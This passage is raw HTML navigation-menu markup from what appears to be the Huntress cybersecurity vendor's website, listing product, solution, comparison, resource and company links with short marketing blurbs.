w-inline-block" tabindex="0"><div class="submenu-item-wrapper"><h6 class="submenu-title-2">SentinelOne</h6></div></a><a href="/comparison/huntress-vs-sophos" class="sub-menu-item-2 single-row bottom_spacing_small w-inline-block" tabindex="0"><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Sophos</h6></div></a><a href="/comparison/huntress-vs-webroot" class="sub-menu-item-2 single-row bottom_spacing_small w-inline-block" tabindex="0"><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Webroot</h6></div></a><a href="/comparison" class="secondary-button w-inline-block" tabindex="0"><div class="secodnary-button-text">Compare All</div><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F779e332a141048329fb98c924119138a" loading="lazy" alt="right arrow" class="secondary-button-icon"/></a></div></div></div></nav></div></li><li class="menu-list-item-wrapper"><div data-hover="true" data-delay="0" blocks-name="navbar1_menu-dropdown" class="nav-dropdown-main-menu desktop-only w-dropdown"><div class="menu-link-container w-dropdown-toggle " aria-controls="w-dropdown-list-3" aria-haspopup="menu" aria-expanded="false" role="button" tabindex="0"><div class="menu-link-text underline-hover">Resources</div></div><nav class="sub-menu-dropdown three w-dropdown-list " aria-labelledby="w-dropdown-toggle-3"><div class="nav-dropdown-wrapper"><div class="nav-dropdown-column"><div class="submenu-text-block">Resource Center</div><div class="sub-menu-item-main"><a href="/resources?assetTypes=Datasheet" class="sub-menu-item-2 single-row bottom_spacing_small w-inline-block" tabindex="0"><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Datasheets</h6></div></a><a href="/resources?assetTypes=eBook" class="sub-menu-item-2 single-row bottom_spacing_small w-inline-block" tabindex="0"><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Ebooks</h6></div></a><a href="/resources?assetTypes=Report" class="sub-menu-item-2 single-row bottom_spacing_small w-inline-block" tabindex="0"><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Reports</h6></div></a><a href="/resources?assetTypes=On-Demand+Webinar" class="sub-menu-item-2 single-row bottom_spacing_small w-inline-block" tabindex="0"><div class="submenu-item-wrapper"><h6 class="submenu-title-2">On-Demand Webinars</h6></div></a><a href="/resources?assetTypes=Whitepaper" class="sub-menu-item-2 single-row bottom_spacing_small w-inline-block" tabindex="0"><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Whitepapers</h6></div></a><a href="/resources?assetTypes=Video" class="sub-menu-item-2 single-row w-inline-block" tabindex="0"><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Videos</h6></div></a></div><a href="/resources" class="secondary-button w-inline-block" tabindex="0"><div class="secodnary-button-text">View All Resources</div><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F779e332a141048329fb98c924119138a" loading="lazy" alt="right arrow" class="secondary-button-icon"/></a></div><div class="nav-dropdown-column"><div class="spacer-24"></div><div class="sub-menu-item-main"><a href="/blog" class="sub-menu-item-2 single-row w-inline-block" tabindex="0"><div class="submenu-icon-wrapper"><img width="51" loading="lazy" alt="" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F40ee60b01d8d49f09d997eb34a43439c" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Blog</h6></div></a><a href="/upcoming-events" class="sub-menu-item-2 single-row w-inline-block" tabindex="0"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F125f40690a05440e9089e436d8b31ca5" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Upcoming Events</h6></div></a><a href="https://support.huntress.io/hc/en-us" target="_blank" class="sub-menu-item-2 single-row w-inline-block" tabindex="0"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F694358fe49614632ad86600a467e9cfe" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Support Documentation</h6></div></a><a href="/integrations" class="sub-menu-item-2 single-row w-inline-block" tabindex="0"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2b996be85228451f95f093c5387c229a" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Integrations</h6></div></a><a href="https://hub.huntress.com/#/page/login" target="_blank" class="sub-menu-item-2 single-row w-inline-block" tabindex="0"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F4c51b19e07db4998921e15175320f9a7" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Huntress Hub</h6></div></a></div></div><div class="nav-dropdown-column background-color-gray hide-tablet"><div class="submenu-text-block no-border">Produced by Huntress</div><div class="sub-menu-item-main"><a href="/tradecraft-tuesday" class="sub-menu-item-2 single-row bottom_spacing_small w-inline-block" tabindex="0"><div class="submenu-icon-wrapper large-icon"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe39cd53f6f734c9fb9c75943e16a2f1f" alt="" class="submenu-desktop-icon large-icon"/></div></a><a href="/firesidechat" class="sub-menu-item-2 single-row bottom_spacing_small w-inline-block" tabindex="0"><div class="submenu-icon-wrapper large-icon"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Febc3adfc1175461e8b12d0fd6532ce26" alt="" class="submenu-desktop-icon large-icon"/></div></a><a href="/product-lab-channel" class="sub-menu-item-2 single-row bottom_spacing_small w-inline-block" tabindex="0"><div class="submenu-icon-wrapper large-icon"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Faed4732478f64b30acfc34fbdf4dd9ff" alt="" class="submenu-desktop-icon large-icon"/></div></a></div></div><div class="nav-dropdown-column background-color-gray show-tablet"><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fa895b30051794852b24aa18710f517e1" loading="lazy" alt="Huntress teal logo" class="platform-nav-image"/><div class="sub-menu-item-main"><div class="submenu-item-wrapper no-icon"><h6 class="submenu-title-2">The Huntress Threat Report</h6><div class="submenu-text-block-2">Try Huntress for free and <br/>deploy in minutes to start <br/>fighting threats.</div></div><a href="/demo" class="secondary-button w-inline-block" tabindex="0"><div class="secodnary-button-text">Learn More</div><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F779e332a141048329fb98c924119138a" loading="lazy" alt="right arrow" class="secondary-button-icon"/></a></div></div></div></nav></div></li><li class="menu-list-item-wrapper"><div data-hover="true" data-delay="0" blocks-name="navbar1_menu-dropdown" class="nav-dropdown-main-menu desktop-only w-dropdown"><div class="menu-link-container w-dropdown-toggle " aria-controls="w-dropdown-list-4" aria-haspopup="menu" aria-expanded="false" role="button" tabindex="0"><div class="menu-link-text underline-hover">About</div></div><nav class="sub-menu-dropdown four w-dropdown-list " aria-labelledby="w-dropdown-toggle-4"><div class="nav-dropdown-wrapper"><div class="nav-dropdown-column"><div class="submenu-text-block">About Huntress</div><div class="sub-menu-item-main"><a href="/company/our-company" class="sub-menu-item-2 single-row w-inline-block" tabindex="0"><div class="submenu-icon-wrapper"><img width="51" loading="lazy" alt="" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Ff4de7538b5ec415fa770b6c07fd89d53" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Our Story</h6></div></a><a href="/company/leadership" class="sub-menu-item-2 single-row w-inline-block" tabindex="0"><div class="submenu-icon-wrapper"><img width="51" loading="lazy" alt="" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fa1ba4e8f20634dc2991a67e2470eb39f" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Leadership</h6></div></a><a href="/company/press" class="sub-menu-item-2 single-row w-inline-block" tabindex="0"><div class="submenu-icon-wrapper"><img width="51" loading="lazy" alt="" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fde237b5630004059a52887d223bd2a83" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Latest News</h6></div></a><a href="/awards-and-accolades" class="sub-menu-item-2 single-row w-inline-block" tabindex="0"><div class="submenu-icon-wrapper"><img width="51" loading="lazy" alt="" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F107b70abda5841439fca3a13a02929cf" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Awards</h6></div></a></div></div><div class="nav-dropdown-column"><div class="spacer-32"></div><div class="sub-menu-item-main"><a href="/company/careers" class="sub-menu-item-2 single-row w-inline-block" tabindex="0"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F80b5a5a31d2245e49c4038e433792c22" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Careers</h6></div></a><a href="/upcoming-events" class="sub-menu-item-2 single-row w-inline-block" tabindex="0"><div class="submenu-icon-wrapper"><img width="51" loading="lazy" alt="" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F9f5b67604e284cb9bdf92a9a456fa608" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Upcoming Events</h6></div></a><a href="/contact-us" class="sub-menu-item-2 single-row w-inline-block" tabindex="0"><div class="submenu-icon-wrapper"><img width="51" loading="lazy" alt="SAT icon" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F3324b3cde0b84f3b8749e3f6577c6540" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Contact Us</h6></div></a></div></div><div class="nav-dropdown-column background-color-gray"><div class="submenu-text-block no-border hide-tablet">Featured Success Story</div><a href="https://cdn.builder.io/o/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F659979229f5449f28c49a65895b9d2ef?alt=media&amp;token=e87850ca-2ec6-4625-a6d9-b2e8a487f1ad&amp;apiKey=3eb6f92aedf74f109c7b4b0897ec39a8" target="_blank" class="sub-menu-nav w-inline-block" tabindex="0"><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fccbc23d75b9640b69566b916ea6f832a" loading="lazy" alt="" class="platform-nav-image last-column"/></a><div class="sub-menu-item-main"><div class="submenu-item-wrapper no-icon"><h6 class="submenu-title-2">Key Methods</h6><div class="submenu-text-block-2"><p>When a mass-isolation event hit, Key Methods realized they were flying blind. See how Huntress Managed SIEM gave them the visibility they needed.</p></div></div><a href="https://cdn.builder.io/o/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F659979229f5449f28c49a65895b9d2ef?alt=media&amp;token=e87850ca-2ec6-4625-a6d9-b2e8a487f1ad&amp;apiKey=3eb6f92aedf74f109c7b4b0897ec39a8" target="_blank" class="secondary-button w-inline-block" tabindex="0"><div class="secodnary-button-text">Learn More</div><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F779e332a141048329fb98c924119138a" loading="lazy" alt="right arrow" class="secondary-button-icon"/></a></div></div></div></nav></div></li><li class="main-menu-button-nav"><a href="/start-trial" class="button-primary navigation-button is-mobile w-button">Free Trial</a></li></ul></nav><div class="menu-button-mobile w-nav-button " data-ix="mobile-menu-open" style="-webkit-user-select:text" aria-label="menu" role="button" tabindex="0" aria-controls="w-nav-overlay-0" aria-haspopup="menu" aria-expanded="false"><div class="top-line" style="transform-style:preserve-3d;transition:all, transform 200ms;transform:translateX(0px) translateY(0px) translateZ(0px) rotateX(0deg) rotateY(0deg) rotateZ(0deg)"></div><div class="middle-line" style="transition:all, opacity 200ms; opacity: 1"></div><div class="bottom-line" style="transform-style:preserve-3d;transition:all, transform 200ms;transform:translateX(0px) translateY(0px) translateZ(0px) rotateX(0deg) rotateY(0deg) rotateZ(0deg)"></div></div></div><div class="w-nav-overlay h-screen hidden"><nav role="navigation" class="navigation-menu-wrapper block" style="transition:all, transform 400ms;transform:translateY(0px)"><ul role="list" class="nav-menu-main mobile w-list-unstyled"><li class="menu-list-item-wrapper"><div data-hover="true" data-delay="0" blocks-name="navbar1_menu-dropdown" class="nav-dropdown-main-menu w-dropdown w--nav-dropdown-open"><div class="menu-link-container w-dropdown-toggle w--nav-dropdown-toggle-open" aria-controls="w-dropdown-list-0" aria-haspopup="menu" aria-expanded="false" role="button" tabindex="0"><div class="menu-link-text underline-hover">Platform</div><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F779e332a141048329fb98c924119138a" alt="Green arrow" class="menu-link-icon"/></div></div><div class="nav-dropdown-main-menu-mobile"><div class="sub-menu-dropdown-mobile "><div class="sub-menu-link-container-mobile back">Back</div><div class="nav-dropdown-wrapper"><div class="nav-dropdown-column"><div class="submenu-text-block first">Huntress Managed Security Platform</div><div class="sub-menu-item-main"><a href="/platform/managed-edr" class="sub-menu-item-2 w-inline-block"><div class="submenu-item-wrapper w-node-f8864d3f-fbc9-1b92-70a4-cb1f0c1b905e-3a6d5916"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F01041f90e1984945aab0dccf0916722e" alt="" class="submenu-desktop-icon"/></div><h6 class="submenu-title-2">Managed EDR</h6></div><div class="submenu-text-block-2 w-node-f8864d3f-fbc9-1b92-70a4-cb1f0c1b9063-3a6d5916">Get full endpoint visibility, detection, and response.</div></a><a href="/platform/security-awareness-training" class="sub-menu-item-2 w-inline-block"><div class="submenu-item-wrapper w-node-f8864d3f-fbc9-1b92-70a4-cb1f0c1b905e-3a6d5916"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F35aa234381d6427a80d30e63bbfaa09f" alt="HSAT icon white" class="submenu-desktop-icon"/></div><h6 class="submenu-title-2">Managed Security Awareness Training</h6></div><div class="submenu-text-block-2 w-node-f8864d3f-fbc9-1b92-70a4-cb1f0c1b9063-3a6d5916">Empower your teams with science-backed security awareness training.</div></a></div><a href="/platform" class="secondary-button hide-tablet w-inline-block"><div class="secodnary-button-text">Platform Overview</div><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F779e332a141048329fb98c924119138a" loading="lazy" alt="right arrow" class="secondary-button-icon"/></a></div><div class="nav-dropdown-column"><div class="sub-menu-item-main"><div class="spacer-52"></div><a href="/platform/managed-itdr" class="sub-menu-item-2 w-inline-block"><div class="submenu-item-wrapper w-node-f8864d3f-fbc9-1b92-70a4-cb1f0c1b905e-3a6d5916"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Ffd3a938d7dfc41bdac34c3f46a36afb2" alt="" class="submenu-desktop-icon"/></div><h6 class="submenu-title-2">Managed ITDR</h6></div><div class="submenu-text-block-2 w-node-f8864d3f-fbc9-1b92-70a4-cb1f0c1b9063-3a6d5916">Protect your Microsoft 365 identities and email environments.</div></a><a href="/platform/siem" class="sub-menu-item-2 w-inline-block"><div class="submenu-item-wrapper w-node-f8864d3f-fbc9-1b92-70a4-cb1f0c1b905e-3a6d5916"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F5638ee75bf42433c81332c153db5cb15" alt="" class="submenu-desktop-icon"/></div><h6 class="submenu-title-2">Managed SIEM</h6></div><div class="submenu-text-block-2 w-node-f8864d3f-fbc9-1b92-70a4-cb1f0c1b9063-3a6d5916">Managed threat response and robust compliance support at a predictable price.</div></a></div><a href="/platform" class="secondary-button hide-desktop w-inline-block"><div class="secodnary-button-text">Platform Overview</div><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F779e332a141048329fb98c924119138a" loading="lazy" alt="right arrow" class="secondary-button-icon"/></a></div><div class="nav-dropdown-column background-color-gray"><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F675068d5b65d403cac4485154bb5ca16" loading="lazy" alt="" class="platform-nav-image"/><div class="sub-menu-item-main"><div class="submenu-item-wrapper no-icon"><h6 class="submenu-title-2">Learn More</h6><div class="submenu-text-block-2">Try Huntress for free and <br/>deploy in minutes to start <br/>fighting threats.</div></div><a href="/demo" class="secondary-button w-inline-block"><div class="secodnary-button-text">Request a Demo</div><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F779e332a141048329fb98c924119138a" loading="lazy" alt="right arrow" class="secondary-button-icon"/></a></div></div></div></div></div></li><li class="menu-list-item-wrapper"><div data-hover="true" data-delay="0" blocks-name="navbar1_menu-dropdown" class="nav-dropdown-main-menu w-dropdown w--nav-dropdown-open"><div class="menu-link-container w-dropdown-toggle w--nav-dropdown-toggle-open" aria-controls="w-dropdown-list-1" aria-haspopup="menu" aria-expanded="false" role="button" tabindex="0"><div class="menu-link-text underline-hover">Solutions</div><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F779e332a141048329fb98c924119138a" alt="Green arrow" class="menu-link-icon"/></div></div><div class="nav-dropdown-main-menu-mobile"><div class="sub-menu-dropdown-mobile hidden"><div class="sub-menu-link-container-mobile back js-menu-click-back w-button">Back</div><div class="nav-dropdown-wrapper"><div class="nav-dropdown-column"><div class="submenu-text-block first">Solutions by Topic</div><div class="sub-menu-item-main"><a href="/solutions/topics/phishing" class="sub-menu-item-2 single-row w-inline-block"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fd8af97b52a364281ae4ae771eac29f60" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Phishing</h6></div></a></div><div class="sub-menu-item-main"><a href="/solutions/topics/cybersecurity-compliance" class="sub-menu-item-2 single-row w-inline-block"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F5437345f68ab4fecb25e1bf64d596f05" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Compliance</h6></div></a></div><div class="sub-menu-item-main"><a href="/solutions/topics/business-email-compromise" class="sub-menu-item-2 single-row w-inline-block"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe0006e0247a84d538abfdb56270b1971" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Business Email Compromise</h6></div></a></div></div><div class="nav-dropdown-column"><div class="submenu-text-block first">Solutions by Industry</div><div class="sub-menu-item-main"><a href="/industries/education" class="sub-menu-item-2 single-row w-inline-block"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F4951efeb175d46a28d43a56e44f1aaa6" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Education</h6></div></a><a href="/industries/financial-services" class="sub-menu-item-2 single-row w-inline-block"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2c6e56c396984defa968946c3305fd5d" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Finance</h6></div></a><a href="/industries/healthcare" class="sub-menu-item-2 single-row w-inline-block"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fad40fb4e0e8f4fc3a283928e18d2cb07" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Healthcare</h6></div></a><a href="/industries/manufacturing" class="sub-menu-item-2 single-row w-inline-block"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fa1a16399f6f94c3da8e42ddbe735c1c1" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Manufacturing</h6></div></a><a href="/industries/state-and-local-government" class="sub-menu-item-2 single-row w-inline-block"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fdafe6a53f78a407c80691541d7e292b9" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">State &amp; Local Government</h6></div></a></div></div><div class="nav-dropdown-column background-color-gray"><div class="submenu-text-block no-border hide-tablet">Featured Resource</div><a href="/solutions/topics/phishing" class="sub-menu-nav w-inline-block"><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F906b12f80f904ae6b4753ee4a19183a7" loading="lazy" alt="" class="platform-nav-image last-column"/></a><div class="sub-menu-item-main"><div class="submenu-item-wrapper no-icon"><h6 class="submenu-title-2">Healthcare Cybersecurity Success Kit</h6><div class="submenu-text-block-2">Packed with the information, tools, and guidance you need to keep your organization running smoothly and, most importantly, your patients safe.</div></div><a href="/solutions/topics/phishing" class="secondary-button w-inline-block"><div class="secodnary-button-text">Learn More</div><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F779e332a141048329fb98c924119138a" loading="lazy" alt="right arrow" class="secondary-button-icon"/></a></div></div></div></div></div></li><li class="menu-list-item-wrapper"><div data-hover="true" data-delay="0" blocks-name="navbar1_menu-dropdown" class="nav-dropdown-main-menu w-dropdown w--nav-dropdown-open"><div class="menu-link-container w-dropdown-toggle w--nav-dropdown-toggle-open" aria-controls="w-dropdown-list-2" aria-haspopup="menu" aria-expanded="false" role="button" tabindex="0"><div class="menu-link-text underline-hover">Why Huntress</div><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F779e332a141048329fb98c924119138a" alt="Green arrow" class="menu-link-icon"/></div></div><div class="nav-dropdown-main-menu-mobile"><div class="sub-menu-dropdown-mobile hidden"><div class="sub-menu-link-container-mobile back js-menu-click-back w-button">Back</div><div class="nav-dropdown-wrapper"><div class="nav-dropdown-column"><div class="submenu-text-block first">Who We Serve</div><div class="sub-menu-item-main"><a href="/why-huntress/managed-service-providers" class="sub-menu-item-2 single-row w-inline-block"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F5e7ba690e3594165ae81c6634bd5674b" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Managed Service Providers</h6></div></a><a href="/why-huntress/value-added-resellers" class="sub-menu-item-2 single-row w-inline-block"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F88641b569dc740a68238040efc5b4475" alt="EDR icon" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Value Added Resellers</h6></div></a><a href="/why-huntress/businesses-it-teams" class="sub-menu-item-2 single-row w-inline-block"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F45741133357a476e828f3fc9eff31134" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Business &amp; IT Teams</h6></div></a></div></div><div class="nav-dropdown-column"><div class="submenu-text-block no-border">The Huntress Difference</div><div class="sub-menu-item-main"><a href="/why-huntress/24-7-soc" class="sub-menu-item-2 single-row w-inline-block"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0b28c9a9c5474bbfa61c1b00f5f205df" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Huntress SOC</h6></div></a><a href="/success-stories" class="sub-menu-item-2 single-row w-inline-block"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fc011a5e2c8c444b2bf1276d09d779297" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Case Studies</h6></div></a></div></div><div class="nav-dropdown-column background-color-gray flex-col"><div class="submenu-text-block no-border">Compare Huntress</div><div class="tablet-grid"><a href="/comparison/huntress-vs-bitdefender" class="sub-menu-item-2 single-row bottom_spacing_small w-inline-block"><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Bitdefender</h6></div></a><a href="/comparison/huntress-vs-blackpoint" class="sub-menu-item-2 single-row bottom_spacing_small w-inline-block"><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Blackpoint</h6></div></a><a href="/comparison/huntress-vs-crowdstrike" class="sub-menu-item-2 single-row bottom_spacing_small w-inline-block"><div class="submenu-item-wrapper"><h6 class="submenu-title-2">CrowdStrike</h6></div></a><a href="/comparison/huntress-vs-datto" class="sub-menu-item-2 single-row bottom_spacing_small w-inline-block"><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Datto</h6></div></a><a href="/comparison/huntress-vs-sentinelone" class="sub-menu-item-2 single-row bottom_spacing_small w-inline-block"><div class="submenu-item-wrapper"><h6 class="submenu-title-2">SentinelOne</h6></div></a><a href="/comparison/huntress-vs-sophos" class="sub-menu-item-2 single-row bottom_spacing_small w-inline-block"><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Sophos</h6></div></a><a href="/comparison/huntress-vs-webroot" class="sub-menu-item-2 single-row bottom_spacing_small w-inline-block"><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Webroot</h6></div></a></div><a href="/comparison" class="secondary-button w-inline-block"><div class="secodnary-button-text">Compare All</div><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F779e332a141048329fb98c924119138a" loading="lazy" alt="right arrow" class="secondary-button-icon"/></a></div></div></div></div></li><li class="menu-list-item-wrapper"><div data-hover="true" data-delay="0" blocks-name="navbar1_menu-dropdown" class="nav-dropdown-main-menu w-dropdown w--nav-dropdown-open"><div class="menu-link-container w-dropdown-toggle w--nav-dropdown-toggle-open" aria-controls="w-dropdown-list-3" aria-haspopup="menu" aria-expanded="false" role="button" tabindex="0"><div class="menu-link-text underline-hover">Resources</div><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F779e332a141048329fb98c924119138a" alt="Green arrow" class="menu-link-icon"/></div></div><div class="nav-dropdown-main-menu-mobile"><div class="sub-menu-dropdown-mobile hidden"><div class="sub-menu-link-container-mobile back js-menu-click-back w-button">Back</div><div class="nav-dropdown-wrapper"><div class="nav-dropdown-column"><div class="submenu-text-block first">Resource Center</div><div class="sub-menu-item-main"><a href="/resources?assetTypes=Datasheet" class="sub-menu-item-2 single-row bottom_spacing_small w-inline-block"><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Datasheets</h6></div></a><a href="/resources?assetTypes=eBook" class="sub-menu-item-2 single-row bottom_spacing_small w-inline-block"><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Ebooks</h6></div></a><a href="/resources?assetTypes=Report" class="sub-menu-item-2 single-row bottom_spacing_small w-inline-block"><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Reports</h6></div></a><a href="/resources?assetTypes=On-Demand+Webinar" class="sub-menu-item-2 single-row bottom_spacing_small w-inline-block"><div class="submenu-item-wrapper"><h6 class="submenu-title-2">On-Demand Webinars</h6></div></a><a href="/resources?assetTypes=Whitepaper" class="sub-menu-item-2 single-row bottom_spacing_small w-inline-block"><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Whitepapers</h6></div></a><a href="/resources?assetTypes=Video" class="sub-menu-item-2 single-row w-inline-block"><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Videos</h6></div></a></div><a href="/resources" class="secondary-button w-inline-block"><div class="secodnary-button-text">View All Resources</div><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F779e332a141048329fb98c924119138a" loading="lazy" alt="right arrow" class="secondary-button-icon"/></a></div><div class="nav-dropdown-column"><div class="spacer-24"></div><div 